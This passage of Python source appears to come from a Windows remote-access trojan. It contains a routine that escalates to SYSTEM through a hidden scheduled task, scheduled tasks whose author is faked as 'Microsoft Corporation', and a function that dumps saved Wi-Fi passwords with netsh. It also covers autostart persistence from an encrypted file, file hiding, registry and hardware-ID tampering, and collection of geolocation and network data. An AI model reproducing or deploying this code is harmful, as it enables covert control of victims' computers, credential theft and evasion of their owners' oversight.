'Mozilla/5.0 (Windows NT 6.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36'}, {'Accept': '*/*', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 OPR/56.0.3051.52'}])

IPCONFIG_URL = 'https://ipinfo.io/json'
IPCONFIG_KEY = {
    'ip': 'ip',
    'isp': 'org',
    'country': 'country',
    'region': 'region',
    'city': 'city',
    'postal': 'postal',
    'timezone': 'timezone',
    'location': 'loc'
}

CIPHER_MAP = {
    wifi_const.CIPHER_TYPE_NONE: 'NONE',
    wifi_const.CIPHER_TYPE_WEP: 'WEP',
    wifi_const.CIPHER_TYPE_TKIP: 'TKIP',
    wifi_const.CIPHER_TYPE_CCMP: 'CCMP (AES)',
    wifi_const.CIPHER_TYPE_UNKNOWN: 'UNKNOWN'
}
AKM_MAP = {
    wifi_const.AKM_TYPE_NONE: 'NONE',
    wifi_const.AKM_TYPE_WPA: 'WPA',
    wifi_const.AKM_TYPE_WPAPSK: 'WPA-PSK',
    wifi_const.AKM_TYPE_WPA2: 'WPA2',
    wifi_const.AKM_TYPE_WPA2PSK: 'WPA2-PSK',
    wifi_const.AKM_TYPE_UNKNOWN: 'UNKNOWN',
    6: NULL
}


def quote(s):
    if not s:
        return '""'

    special_chars = {' ', '&', '(', ')', '[', ']', '{', '}', '^', '=', ';', '!', "'", '"', '+', ',', '`', '~'}

    if any(n in special_chars for n in s):
        return f'"{s.replace("\"", "\\\"")}"'
    
    return s


def write_file(path, data):
    if isinstance(data, str):
        with open(path, 'w', encoding=FILE_ENCODING) as f:
            f.write(data)
    else:
        with open(path, 'wb') as f:
            f.write(data)


def read_file(path, b=False):
    if not b:
        with open(path, 'r', encoding=FILE_ENCODING) as f:
            return f.read()
    else:
        with open(path, 'rb') as f:
            return memoryview(f.read())
        

def change_file(path, pattern, value, delete=False, enc=False):
    changed = False

    if not os.path.isfile(path):
        return changed

    if not value.endswith('\n'):
        value += '\n'

    with open(path, 'r', encoding=FILE_ENCODING) as f:
        if enc:
            f_data = f.read()

            try:
                f_data = decrypt(f_data).splitlines() if f_data else ['']
            except:
                f_data = ['']
        else:
            f_data = f.readlines()

    with open(path, 'w', encoding=FILE_ENCODING) as f:
        if not delete:
            for n in f_data:
                n = n.rstrip()

                if pattern in n:
                    f.write(encrypt(value) if enc else value)
                    changed = True
                else:
                    f.write(encrypt(n + '\n') if enc else n + '\n')
                    
            if not changed and (value not in f_data):
                f.write(encrypt(value) if enc else value)
                changed = True
        else:
            for n in f_data:
                n = n.rstrip()

                if pattern in n:
                    changed = True
                else:
                    f.write(encrypt(n + '\n') if enc else n + '\n')
                    
    return changed


def encrypt(data):
    k0, k1 = KEY
    f = 0

    with StringIO() as buf:
        for (i, c) in enumerate(data):
            n = ord(c)  
            x = (n << k0) ^ (((k1 + f) + i) & 0xFF)
            f = (f ^ x) & 0xFF
            
            buf.write(chr(x))
        
        return buf.getvalue()


def decrypt(data):
    k0, k1 = KEY
    f = 0

    with StringIO() as buf:
        for (i, c) in enumerate(data):
            n = ord(c)     
            x = n ^ (((k1 + f) + i) & 0xFF)  
            o = x >> k0        
            f = (f ^ n) & 0xFF 
            
            buf.write(chr(o))
        
        return buf.getvalue()


def decode_bytes(data):
    chunk_size = 4096

    len_data = len(data)
    preview = data[:255].tobytes() if len_data > 0 else b''

    detected = detect(preview)
    encoding = detected.get('encoding') or ENCODING

    decoder = getincrementaldecoder(encoding)()

    with StringIO() as buf:
        for n in range(0, len_data, chunk_size):
            buf.write(decoder.decode(data[n:n + chunk_size]))

        buf.write(decoder.decode(b'', final=True))

        return buf.getvalue()
    
        
def mem_id(user_id):
    return str((user_id << KEY[0]) ^ KEY[1])


if os.path.isfile(CONFIG_SEED):
    try:
        new_seed = read_file(CONFIG_SEED)

        if new_seed.isdigit():
            SEED = int(new_seed)
    except: 
        os.remove(CONFIG_SEED)


seed(SEED)
KEY = (randint(1, 7), randint(1, 255))


def get_date():
    try: 
        now = datetime.now()

        return [now.strftime('%H:%M'), now.strftime('%d.%m.%Y')]
    except: 
        return [NULL, NULL]
    

def http(url, json=False):
    try:
        query = http_get(url, headers=HTTP_HEADER, timeout=60)
        query.raise_for_status()
    except:
        return dict() if json else None
    
    if json:
        try:
            return query.json()
        except:
            return dict()
    else:
        return memoryview(query.content)  
    

def mkdir(path):
    if isinstance(path, str):
        if not os.path.isdir(path):
            os.mkdir(path)
    else:
        for n in path:
            if not os.path.isdir(n):
                os.mkdir(n)


def get_layout():
    try:
        return KEYBOARD_LAYOUT.get(f'{win32api.GetKeyboardLayout(win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())[0]) & 0xFFFF:08X}', NULL)
    except:
        return NULL


def shell(command, output=False):
    try:
        executed = sp_run(
            command, 
            input=False, 
            stdout=PIPE if output else DEVNULL, 
            stderr=DEVNULL, 
            shell=True
        )
    except:
        return None if output else False

    if output:
        if executed.stdout is None:
            return None
        
        return decode_bytes(memoryview(executed.stdout))

    return executed.returncode == 0
            

def parse_cmd(exp, cmd):
    args = re_exp(exp, flags=DOTALL).match(cmd)

    if args:
        return {k: None if v is None else v.strip()  
                for (k, v) in args.groupdict().items()}

    return dict()


def autostart():
    if not os.path.isfile(FILE_AUTOSTART):
        return
    
    try:
        autostart_data = decrypt(read_file(FILE_AUTOSTART)).splitlines()
    except:
        return
    
    for line in autostart_data:
        try:
            name, args = line.split('=', 1)

            _, path, window = name.split('\u200B')
            args = args.split('\u200B')[0]

            launch(path, '' if args == 'none' else args, window == 'true')
        except:
            continue


def getsystem():
    if IS_EXE:
        tpath = __file__
        targs = 'none'
    else:
        tpath = py_path
        targs = __file__

    is_tcreated = create_task(
        'system',
        name=GETSYSTEM_TASK_NAME,
        description='Win32 System Rights',
        path=tpath,
        targs=targs,
        hidden='true',
        event=['startup']
    )

    if not is_tcreated:
        return False

    CoInitialize()
    try:
        st = scheduler()
        st.GetTask(GETSYSTEM_TASK_NAME).Run(None)
        st.DeleteTask(GETSYSTEM_TASK_NAME, 0)
    except:
        return False
    finally:
        CoUninitialize()
    
    return True


def get_owner_path(path):
    try:
        owner_sid = win32security.GetFileSecurity(path, win32security.OWNER_SECURITY_INFORMATION).GetSecurityDescriptorOwner()
        owner, domain, _ = win32security.LookupAccountSid(None, owner_sid)

        return os.path.join(domain, owner)
    except:
        return NULL
    

def ls():
    directory = []

    for n in os.listdir('.'):
        try:
            stat = os.lstat(n)
            
            size = f'{stat.st_size} bytes'  
            time = ctime(stat.st_mtime)  
            attr = (win32api.GetFileAttributes(n) & win32con.FILE_ATTRIBUTE_HIDDEN) != 0

            directory.append([
                n, 
                'DIR' if os.path.isdir(n) else 'FILE', 
                'TRUE' if attr else 'FALSE', 
                get_owner_path(n),
                size, 
                time
            ])
        except:
            continue

    return directory


def hide(path):
    hidden = False

    try:
        current_attribute = win32api.GetFileAttributes(path)
    except:
        return hidden

    if current_attribute == -1:
        return hidden

    if not (current_attribute & win32con.FILE_ATTRIBUTE_HIDDEN):
        win32api.SetFileAttributes(path, current_attribute | win32con.FILE_ATTRIBUTE_HIDDEN)

        if win32api.GetFileAttributes(path) & win32con.FILE_ATTRIBUTE_HIDDEN:
            hidden = True
    else:
        hidden = True

    return hidden


def unhide(path):
    unhidden = False

    try:
        current_attribute = win32api.GetFileAttributes(path)
    except:
        return unhidden

    if current_attribute == -1:
        return unhidden
    
    if current_attribute & win32con.FILE_ATTRIBUTE_HIDDEN:
        win32api.SetFileAttributes(path, current_attribute & ~win32con.FILE_ATTRIBUTE_HIDDEN)

        if not (win32api.GetFileAttributes(path) & win32con.FILE_ATTRIBUTE_HIDDEN):
            unhidden = True
    else:
        unhidden = True

    return unhidden


def ipconfig():
    try:
        global_inet = http(IPCONFIG_URL, json=True)
    except:
        global_inet = None
    else:
        global_inet_data = {
            'ip': global_inet.get(IPCONFIG_KEY['ip'], NULL),
            'isp': global_inet.get(IPCONFIG_KEY['isp'], NULL),
            'country': global_inet.get(IPCONFIG_KEY['country'], NULL),
            'region': global_inet.get(IPCONFIG_KEY['region'], NULL),
            'city': global_inet.get(IPCONFIG_KEY['city'], NULL),
            'postal': global_inet.get(IPCONFIG_KEY['postal'], NULL),
            'timezone': global_inet.get(IPCONFIG_KEY['timezone'], NULL),
            'location': global_inet.get(IPCONFIG_KEY['location'], NULL)  
        }

    try:
        local_inet = []

        for (name, address) in psutil.net_if_addrs().items():
            adapter = {
                'name': name, 
                'mac': NULL,
                'ipv4': NULL, 
                'ipv6': NULL
            }

            for n in address:
                if n.family == AF_INET:
                    adapter['ipv4'] = NULL if n.address is None else n.address
                elif n.family == AF_INET6:
                    adapter['ipv6'] = NULL if n.address is None else n.address
                else:
                    adapter['mac'] = NULL if n.address is None else n.address.replace('-', ':').upper()
            
            local_inet.append(adapter)
    except:
        local_inet = None

    return {
        'global': global_inet_data,
        'local': local_inet
    }


def route():
    route_result = {
        'ipv4': [],
        'ipv6': []
    }

    route_print_4 = shell('route PRINT -4', output=True)
    route_print_6 = shell('route PRINT -6', output=True)

    if route_print_4 is not None:
        for line in route_print_4.splitlines():
            n = line.split()

            if (len(n) < 5) or (n[1].count('.') != 3):
                continue
            
            route_result['ipv4'].append([
                n[0],
                n[1],
                n[3],
                n[2],
                n[4]
            ])
    else:
        route_result['ipv4'] = None
    
    if route_print_6 is not None:
        for line in route_print_6.splitlines():
            n = line.split()

            if len(n) < 3:
                continue
            
            if n[2].count('::'):
                route_result['ipv6'].append([
                    n[2],
                    n[-1] if n[2] != n[-1] else 'On-link',
                    ' '.join(n[:2])
                ])
    else:
        route_result['ipv6'] = None

    return route_result


def arp():
    arp_result = []

    arp_a = shell('arp -a', output=True)

    if arp_a is None:
        return arp_result

    for line in arp_a.splitlines():
        n = line.split()

        if (len(n) < 3) or (n[0].count('.') != 3):
            continue

        arp_result.append([
            n[0],
            n[1].replace('-', ':').upper(),
            n[2]
        ])
    
    return arp_result


def netstat():
    netstat_result = []

    netstat_ano = shell('netstat -ano', output=True)

    if netstat_ano is None:
        return netstat_result

    for line in netstat_ano.splitlines():
        n = line.split()

        if (len(n) < 4) or (not n[-1].isdigit()):
            continue

        status = n[3]

        netstat_result.append([
            n[-1],  
            n[0],  
            n[1] ,  
            n[2],  
            status if not status.isdigit() else NULL
        ])
    
    return netstat_result 


def ghz_to_channel(ghz):
    if (ghz == NULL) or (ghz < 0):
        return NULL

    mhz = ghz * 1000  

    if 2400 <= mhz <= 2500: 
        return int((mhz - 2407) // 5)
    elif 5000 <= mhz <= 6000:
        return int((mhz - 5000) // 5)
    elif 5950 <= mhz <= 7125:
        return int((mhz - 5950) // 5)
    
    return NULL


def wifi():
    wifi_result = []

    interfaces = PyWiFi().interfaces()

    if not interfaces:
        return wifi_result
    
    iface_result = []

    for iface in interfaces:
        try:
            iface.scan()
            sleep(3)
            iface_result = iface.scan_results()
        except:
            continue

        if iface_result:
            break

    if not iface_result:
        return wifi_result
    
    iface_result.sort(key=lambda n: n.signal, reverse=True)

    for n in iface_result:
        if hasattr(n, 'ssid'):
            try:
                ssid = n.ssid.encode('raw_unicode_escape').decode(errors='replace') or '<hidden>'
            except:
                ssid = n.ssid or '<hidden>' 
        else:
            ssid = None

        ghz = getattr(n, 'freq', NULL)

        if ghz != NULL:
            ghz = round(ghz / 1_000_000, 3)

        wifi_result.append([
            ssid,
            getattr(n, 'bssid', NULL).rstrip(':').upper(),
            ghz,
            ghz_to_channel(ghz),
            AKM_MAP.get(getattr(n, 'akm', [6])[0]),
            CIPHER_MAP.get(getattr(n, 'cipher', NULL)),
            getattr(n, 'signal', NULL)
        ])

    return wifi_result


def wifi_password():
    wifi_password_result = []

    wlan_profile = shell('netsh wlan show profiles', output=True)

    if wlan_profile is None:
        return wifi_password_result
    
    profile = []
    
    for n in wlan_profile.splitlines():
        if ':' in n:
            profile_pattern = n.split(':', 1)[-1].strip()

            if profile_pattern:
                profile.append(profile_pattern)

    if not profile:
        return wifi_password_result
    
    for n in profile:
        profile_name = shell(f'netsh wlan show profile name={quote(n)} key=clear', output=True)

        if not profile_name:
            continue

        password_pattern = []
        flag = 0

        for i in profile_name.splitlines():
            if flag == 3:
                if ':' in i:
                    password_pattern.append(i.split(':', 1)[-1])

            if i.startswith('-------'):
                flag += 1

        if password_pattern:
            wifi_password_result.append([n, password_pattern[-1]])

    return wifi_password_result 


def device(mode, id=None, driver=None, changes=None):


    def verify_id():
        if parse_cmd(r'(?P<GUID>[{][0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}[}])', id) and shell(f'pnputil /enum-devices /class {quote(id)}'):
            return 'class'
    
        if (id.split(os.sep, 1)[0] in reg_enum(REG_KEY_DEVICE, dir=True)) and shell(f'pnputil /enum-devices /instanceid {quote(id)}'):
            return 'instanceid'
            
        return False


    match mode:
        case 'devices':
            devices = []

            pnputil = shell('pnputil /enum-devices /format csv', output=True)

            if pnputil is None:
                return devices
            
            for n in csv(StringIO(pnputil)):
                devices.append([
                    n.get('InstanceId', NULL),
                    n.get('ClassGuid', NULL),
                    n.get('DeviceDescription', NULL),
                    n.get('ClassName', NULL),
                    n.get('ManufacturerName', NULL),
                    n.get('DriverName', NULL),
                    n.get('Status', NULL).upper()
                ])

            return devices
        case 'query':
            dev = verify_id()

            if not dev:
                return None
            
            qdev = []
            
            pnputil = shell(f'pnputil /enum-devices /{dev} {quote(id)} /format csv', output=True)

            for n in csv(StringIO(pnputil)):
                qdev.append([
                    n.get('InstanceId', NULL),
                    n.get('ClassGuid', NULL),
                    n.get('DeviceDescription', NULL),
                    n.get('ClassName', NULL),
                    n.get('ManufacturerName', NULL),
                    n.get('DriverName', NULL),
                    n.get('Status', NULL).upper()
                ])

            return qdev
        case 'install_driver':
            return shell(f'pnputil /add-driver {quote(driver)} /install')
        case 'delete_driver':
            return shell(f'pnputil /delete-driver {quote(driver)} /uninstall')
        case 'delete':
            dev = verify_id()

            if not dev:
                return None
            
            return shell(f'pnputil /remove-device /{dev} {quote(id)}')
        case 'enable':
            dev = verify_id()

            if not dev:
                return None
            
            return shell(f'pnputil /enable-device /{dev} {quote(id)}') 
        case 'restart':
            dev = verify_id()

            if not dev:
                return None
            
            return shell(f'pnputil /restart-device /{dev} {quote(id)}')
        case 'disable':
            dev = verify_id()

            if not dev:
                return None
            
            return shell(f'pnputil /disable-device /{dev} {quote(id)}')
        case 'value':
            ckey, cname = DEVICE_CHANGES.get(changes)

            try:
                if changes in {'cpu', 'cpu_id', 'cpu_mhz', 'cpu_vendor'}:
                    return reg_get_value(os.path.join(ckey, '0'), cname)[0]          
                elif changes in {'os_edition', 'os_version', 'os_build'}:
                    return reg_get_value(ckey, cname[0])[0]
                elif changes == 'os_date':
                    return ctime(reg_get_value(ckey, cname)[0])
                elif changes in {'device_name', 'device_desc'}:
                    return reg_get_value(os.path.join(REG_KEY_DEVICE, id), cname)[0] if verify_id() == 'instanceid' else NULL
                else:
                    return reg_get_value(ckey, cname)[0]
            except:
                return NULL
        case 'change':
            cdev, cvalue = changes

            ckey, cname = DEVICE_CHANGES.get(cdev)

            try:
                if cdev in {'cpu', 'cpu_id', 'cpu_mhz', 'cpu_vendor'}:
                    for n in reg_enum(ckey, dir=True):
                        reg_set_value(os.path.join(ckey, n), cname, cvalue, 'dword' if cname == '~MHz' else 'sz')                 
                    return True
                elif cdev in {'os_edition', 'os_version', 'os_build'}:
                    for n in cname:
                        reg_set_value(ckey, n, cvalue, 'sz')
                    return True
                elif cdev == 'os_date':
                    reg_set_value(ckey, cname, int(mktime(datetime.strptime(cvalue, '%H:%M:%S %d.%m.%Y').timetuple()) - timezone), 'dword')
                    return True
                elif cdev == 'node':
                    reg_set_value(ckey, cname, cvalue, 'sz')
                    powershell(f'Rename-Computer -Force -NewName {quote(cvalue)}')
                    return True
                elif cdev in {'device_name', 'device_desc'}:
                    if verify_id() == 'instanceid':
                        reg_set_value(os.path.join(REG_KEY_DEVICE, id), cname, cvalue, 'sz')
                        return True
                    else:
                        return False
                else:
                    reg_set_value(ckey, cname, cvalue, 'sz')
                    return True
            except:
                return False
        case 'update':
            shell('pnputil /scan-devices')


def systeminfo():
    with StringIO() as buf:
        buf.write(f'''SYSTEM:
\tMACHINE: {MACHINE}
\tARCHITECTURE: {ARCHITECTURE}
\tOS: {OS["platform"]} {OS["release"]} {OS["edition"]} {OS["version"]}
\tNODE: {NODE}
\tUSER: {USER}
\tLANG: {LANG}
\tLAYOUT: {get_layout()}
\tENCODING: {ENCODING}
''')
        
        buf.write('\nUSER:\n')
        pusers = psutil.users()

        if pusers:
            for n in pusers:
                try:
                    sid = str(win32security.LookupAccountName(None, n.name)[0]).removeprefix('PySID:')
                except:
                    sid = NULL

                buf.write(f'''\tSID: {sid}
\tNAME: {NULL if n.name is None else n.name}
\tHOST: {NULL if n.host is None else n.host}
\tTERMINAL: {NULL if n.terminal is None else n.terminal}
\tSTARTED: {NULL if n.started is None else ctime(n.started)}\n
''')
        
        buf.write(('' if pusers else '\n') + 'IPCONFIG:\n')
        ipconfig_dict = ipconfig()
        
        ipconfig_global, ipconfig_local = ipconfig_dict['global'], ipconfig_dict['local']

        if ipconfig_global is not None:
            buf.write(f'''\tGLOBAL:
\t\tIP: {ipconfig_global["ip"]}
\t\tISP: {ipconfig_global["isp"]}
\t\tCOUNTRY: {ipconfig_global["country"]}
\t\tREGION: {ipconfig_global["region"]}
\t\tCITY: {ipconfig_global["city"]}
\t\tPOSTAL: {ipconfig_global["postal"]}
\t\tTIMEZONE: {ipconfig_global["timezone"]}
\t\tLOCATION: {ipconfig_global["location"]}''')
            
        if ipconfig_local is not None:
            buf.write('\n\n\tLOCAL:\n')

            for n in ipconfig_local:
                buf.write(f'\t\tADAPTER: {n["name"]}\n\t\tMAC: {n["mac"]}\n\t\tIPV4: {n["ipv4"]}\n\t\tIPV6: {n["ipv6"]}\n\n')
                
        try:
            bios_vendor = reg_get_value(REG_KEY_BIOS, 'BIOSVendor')[0]
        except:
            bios_vendor = NULL
        try:
            bios_version = reg_get_value(REG_KEY_BIOS, 'BIOSVersion')[0]
        except:
            bios_version = NULL        
        try:
            bios_date = reg_get_value(REG_KEY_BIOS, 'BIOSReleaseDate')[0]
        except:
            bios_date = NULL

        buf.write(('\n' if ipconfig_local is None else '') + f'BIOS:\n\tVENDOR: {bios_vendor}\n\tVERSION: {bios_version}\n\tDATE: {bios_date}\n')
        
        try:
            baseboard_product = reg_get_value(REG_KEY_BIOS, 'BaseBoardProduct')[0]
        except:
            baseboard_product = NULL
        try:
            baseboard_vendor = reg_get_value(REG_KEY_BIOS, 'BaseBoardManufacturer')[0]
        except:
            baseboard_vendor = NULL
        try:
            baseboard_version = reg_get_value(REG_KEY_BIOS, 'BaseBoardVersion')[0]
        except:
            baseboard_version = NULL        
        
        buf.write(f'\nBASEBOARD:\n\tPRODUCT: {baseboard_product}\n\tVENDOR: {baseboard_vendor}\n\tVERSION: {baseboard_version}\n')
        
        buf.write('\nBATTERY:\n')
        battery = psutil.sensors_battery()
        
        if battery:
            buf.write(f'''\tPERCENT: {NULL if battery.percent is None else battery.percent}%
\tPLUGGED IN: {NULL if battery.power_plugged is None else battery.power_plugged}
\tTIME LEFT: {battery.secsleft // 60 if (battery.secsleft is None) or (battery.secsleft > 0) else NULL} minutes
''')
            
        pcpu_freq = psutil.cpu_freq()
        pcpu_percent = psutil.cpu_percent()

        cpu_freq = int(pcpu_freq.current) if pcpu_freq and (pcpu_freq.current is not None) else NULL
        cpu_usage = int(pcpu_percent) if pcpu_percent else (0 if pcpu_percent == 0 else NULL)

        buf.write(f'''\nCPU:
\tNAME: {PROCESSOR}
\tCORE: {os.cpu_count()}
\tFREQUENCY: {cpu_freq} MHz
\tUSAGE: {cpu_usage}%
''')
        
        buf.write('\nGPU:\n')
        pvideocard = powershell('Get-WmiObject Win32_VideoController | Select-Object Caption, VideoModeDescription, AdapterCompatibility, VideoProcessor, CurrentHorizontalResolution, CurrentVerticalResolution, CurrentRefreshRate, Status | ConvertTo-Csv -NoTypeInformation', output=True)
        
        if pvideocard is not None:
            for n in csv(StringIO(pvideocard)):
                if n.get('Status', NULL) == 'OK':
                    buf.write(f'''\tNAME: {n.get("Caption", NULL)}
\tDESCRIPTION: {n.get("VideoModeDescription", NULL)}
\tVENDOR: {n.get("AdapterCompatibility", NULL)}
\tPROCESSOR: {n.get("VideoProcessor", NULL)}
\tRESOLUTION: {n.get("CurrentHorizontalResolution", NULL)}x{n.get("CurrentVerticalResolution", NULL)}
\tREFRESH: {n.get("CurrentRefreshRate", NULL)} Hz
''')
                    break

        buf.write('\nRAM:\n')
        pmemory = psutil.virtual_memory()

        if pmemory:
            buf.write(f'''\tTOTAL: {NULL if pmemory.total is None else pmemory.total >> 30} GB
\tUSED: {NULL if pmemory.used is None else pmemory.used >> 30} GB
\tFREE: {NULL if pmemory.free is None else pmemory.free >> 30} GB
\tUSAGE: {NULL if pmemory.percent is None else int(pmemory.percent)}%
''')
        
        buf.write('\nSWAP:\n')
        pswap = psutil.swap_memory()
        
        if pswap:
            buf.write(f'''\tTOTAL: {NULL if pswap.total is None else pswap.total >> 30} GB
\tUSED: {NULL if pswap.used is None else pswap.used >> 30} GB
\tFREE: {NULL if pswap.free is None else pswap.free >> 30} GB
\tUSAGE: {int(pswap.percent)}%
''')
        
        buf.write('\nDISK:\n')
        pdisk = psutil.disk_partitions()

        if pdisk:
            for n in pdisk:
                pdisk_usage = psutil.disk_usage(n.mountpoint)

                buf.write(f'''\tNAME: {NULL if n.device is None else n.device}
\tMOUNT OPTION: {NULL if n.opts is None else n.opts}
\tFILE SYSTEM: {NULL if n.fstype is None else n.fstype}
\tTOTAL: {NULL if pdisk_usage.total is None else pdisk_usage.total >> 30} GB
\tUSED: {NULL if pdisk_usage.used is None else pdisk_usage.used >> 30} GB
\tFREE: {NULL if pdisk_usage.free is None else pdisk_usage.free >> 30} GB
\tUSAGE: {NULL if pdisk_usage.percent is None else int(pdisk_usage.percent)}%\n
''')
        
        return buf.getvalue()


def reg_parse_key(key):
    path = key.split(os.sep, 1) 

    reg_root_key, reg_key = path[0], path[1] if len(path) == 2 else ''

    reg_root_key = REG_ROOT_KEY.get(reg_root_key.upper())

    if reg_root_key is None:
        raise ValueError

    return [reg_root_key, reg_key]


def reg_create_key(key, name):
    root, key = reg_parse_key(key)

    with winreg.OpenKey(root, key) as r:
        winreg.CreateKey(r, name)


def reg_delete(key, name, dir):
    root, key = reg_parse_key(key)

    with winreg.OpenKey(root, key, access=winreg.KEY_ALL_ACCESS) as r:
        (winreg.DeleteKey if dir else winreg.DeleteValue)(r, name)


def reg_get_value(key, name):
    root, key = reg_parse_key(key)

    with winreg.OpenKey(root, key, access=winreg.KEY_READ) as r:
        value, value_type = winreg.QueryValueEx(r, name)

        return [value, REG_TYPE.get(value_type, NULL)]


def reg_set_value(key, name, value, reg_type):
    root, key = reg_parse_key(key)

    match reg_type:
        case 'none':
            reg_value_type = winreg.REG_NONE
            value = None
        case 'sz':
            reg_value_type = winreg.REG_SZ
        case 'expand_sz':
            reg_value_type = winreg.REG_EXPAND_SZ
        case 'binary':
            reg_value_type = winreg.REG_BINARY
            value = bytes(value)
        case 'dword':
            reg_value_type = winreg.REG_DWORD
            value = int(value)
        case 'dword_big_endian':
            reg_value_type = winreg.REG_DWORD_BIG_ENDIAN
            value = int(value)
        case 'qword':
            reg_value_type = winreg.REG_QWORD
            value = int(value)
    
    with winreg.OpenKey(root, key, access=winreg.KEY_SET_VALUE) as r:
        winreg.SetValueEx(r, name, 0, reg_value_type, value)


def reg_enum(key, dir):
    root, key = reg_parse_key(key)

    enum = winreg.EnumKey if dir else winreg.EnumValue
    enum_index = 0
    enum_result = []

    with winreg.OpenKey(root, key) as r:
        while True:
            try:
                n = enum(r, enum_index)

                enum_result.append(n if dir else [
                    n[0],
                    n[1],
                    REG_TYPE.get(n[2], NULL)
                ])
                enum_index += 1
            except OSError:
                break
    
    return enum_result


def exist_service(name):
    try:
        win32serviceutil.QueryServiceStatus(name)
    except:
        return False
    else:
        return True


def service():
    services = []
    
    for n in psutil.win_service_iter():
        try:
            pid = n.pid()
        except:
            pid = NULL

        try:
            description = n.description()
        except:
            description = NULL

        pid = pid or NULL
        description = description or NULL
        username = n.username() or NULL
        binpath = n.binpath() or NULL
        start_type = n.start_type() or NULL
        status = n.status() or NULL
            
        services.append([
            pid,
            n.name(),
            n.display_name(),
            description,
            username,
            binpath,
            start_type.upper(),
            status.upper()
        ])

    return services


def scheduler():
    try:
        scheduler = Dispatch('Schedule.Service')
        scheduler.Connect()
        return scheduler.GetFolder(os.sep)
    except:
        raise ConnectionError('failed to connect scheduler [*]')
    

def exist_task(name):
    try:
        scheduler().GetTask(name)
    except:
        return False
    else:
        return True


def create_task(tuser, name, description, path, targs, hidden, event, bot_task=False):
    CoInitialize()

    try:
        _scheduler = Dispatch('Schedule.Service')
        _scheduler.Connect()

        task_def = _scheduler.NewTask(0)
        settings = task_def.Settings
        principal = task_def.Principal

        task_def.RegistrationInfo.Description = description
        task_def.RegistrationInfo.Author = 'Корпорация Майкрософт.' if LANG in {'ru_RU', 'uk_UA'} else 'Microsoft Corporation.'

        match tuser:
            case 'system':
                principal.UserId = 'SYSTEM'
                user_logon = 5
            case 'users':
                user_logon = 0
            case 'user':
                user_logon = 3

        event_type = event[0]

        match event_type:
            case 'startup':  
                trigger = task_def.Triggers.Create(8)  
            case 'logon':  
                trigger = task_def.Triggers.Create(9)  

                if user_logon == 3:
                    trigger.UserId = USER
            case 'logoff':
                trigger = task_def.Triggers.Create(11)  
                trigger.StateChange = 2

                if user_logon == 3:
                    trigger.UserId = USER
            case 'idle':  
                minute, hour = event[-1].split()

                trigger = task_def.Triggers.Create(6)  

                idle = settings.IdleSettings
                idle.IdleDuration = timedelta(minutes=int(minute))  
                idle.WaitTimeout = timedelta(hours=int(hour))           
                idle.RestartOnIdle = False      
            case 'time':  
                if bot_task:
                    trigger = task_def.Triggers.Create(1)  
                    trigger.StartBoundary = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
                    trigger.Repetition.Interval = 'PT1M'
                else:
                    ttime = event[1]

                    datetime.strptime(ttime, '%Y-%m-%dT%H:%M:%S')

                    trigger = task_def.Triggers.Create(1)  
                    trigger.StartBoundary = ttime
            case 'event':  
                tevent = event[-1]

                if not tevent.startswith('<QueryList>') or not tevent.endswith('</QueryList>'):
                    raise ValueError

                trigger = task_def.Triggers.Create(0)  
                trigger.Subscription = tevent
            case _:
                raise ValueError
            
        if event_type != 'time':
            trigger.StartBoundary = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
        
        action = task_def.Actions.Create(0)  
        action.Path = os.path.abspath(path)

        if targs != 'none':
            action.Arguments = targs
            
        principal.RunLevel = 1
        settings.Priority = 7
        settings.Enabled = True
        settings.Hidden = hidden
        settings.AllowDemandStart = True
        settings.StartWhenAvailable = True
        settings.AllowHardTerminate = False
        settings.ExecutionTimeLimit = 'PT0S'
        settings.RunOnlyIfIdle = False
        settings.StopIfGoingOnBatteries = False 
        settings.DisallowStartIfOnBatteries = False
        settings.IdleSettings.StopOnIdleEnd = False

        _scheduler.GetFolder(os.sep).RegisterTaskDefinition(
            name,                
            task_def,                 
            6,                        
            None,                     
            None,                    
            user_logon,                        
        )
    except (ValueError, IndexError):
        return False
    except:
        return None
    else:
        return True
    finally:
        CoUninitialize()


def task():
    tasks = []

    schtasks_query = shell('schtasks /query /fo csv', output=True)

    if schtasks_query is None:
        return tasks
    
    for i in csv(StringIO(schtasks_query)):
        n = list(i.values())

        if len(n) == 3:
            tasks.append([
                n[0],
                n[1],
                n[2]
            ])
    
    return tasks 


def startup_enum(key, key_status):
    startup_enum_key = []

    try:
        if os.path.isdir(key):
            for name in os.listdir(key):
                if name == 'desktop.ini':
                    continue

                status = True

                for (s_name, s_value, _) in reg_enum(key_status, dir=False):
                    if s_name == name:
                        status = s_value == REG_VALUE_STARTUP_ENABLED 
                
                startup_enum_key.append([
                    name,
                    os.path.join(key, name),
                    status
                ])
        else:
            for (name, value, _) in reg_enum(key, dir=False):

                status = True
                
                for (s_name, s_value, _) in reg_enum(key_status, dir=False):
                    if s_name == name:
                        status = s_value == REG_VALUE_STARTUP_ENABLED

                startup_enum_key.append([
                    name,
                    value,
                    status
                ])                   
    except: ...
        
    return startup_enum_key


def startup():
    with StringIO() as buf:
        startup_machine = startup_enum(REG_KEY_STARTUP_MACHINE, REG_KEY_STARTUP_MACHINE_STATUS)
        startup_path_machine = startup_enum(PATH_STARTUP_MACHINE, PATH_STARTUP_MACHINE_STATUS)
        startup_user = startup_enum(REG_KEY_STARTUP_USER, REG_KEY_STARTUP_USER_STATUS)
        startup_path_user = startup_enum(PATH_STARTUP_USER, PATH_STARTUP_USER_STATUS)

        if startup_machine:
            buf.write('STARTUP MACHINE:\n')

            for n in startup_machine:
                buf.write(f'\tNAME: {n[0]}\n\tCOMMAND: {n[1]}\n\tSTATUS: {"ENABLED" if n[2] else "DISABLED"}\n\n')
            
        if startup_path_machine:
            if not startup_machine:
                buf.write('STARTUP MACHINE:\n')

            for n in startup_path_machine:
                buf.write(f'\tNAME: {n[0]}\n\tCOMMAND: {n[1]}\n\tSTATUS: {"ENABLED" if n[2] else "DISABLED"}\n\n')
                
        if startup_user:
            buf.write('STARTUP USER:\n')

            for n in startup_user:
                buf.write(f'\tNAME: {n[0]}\n\tCOMMAND: {n[1]}\n\tSTATUS: {"ENABLED" if n[2] else "DISABLED"}\n\n')
